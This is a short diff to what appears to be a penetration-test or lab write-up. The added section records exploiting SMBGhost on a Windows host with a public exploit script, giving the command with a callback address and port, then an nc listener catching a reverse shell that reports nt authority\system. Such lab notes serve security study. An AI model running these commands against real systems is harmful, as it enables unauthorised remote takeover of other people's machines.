@@ -49,10 +49,22 @@ cat pentest_report.txt
 
 This should have been vulnerable to printnightmare but I could not get it to work, so I used SMBGhost
 
+## SMBGhost
 https://github.com/Barriuso/SMBGhost_AutomateExploitation
 
 ```
 ./Smb_Ghost.py -i 10.10.110.20 --check -e --lhost 10.10.14.21 --lport 80
 ```
+```
+ nc -lvp 80
+listening on [any] 80 ...
+10.10.110.20: inverse host lookup failed: Unknown host
+connect to [10.10.14.21] from (UNKNOWN) [10.10.110.20] 49707
+Microsoft Windows [Version 10.0.18363.592]
+(c) 2019 Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
 
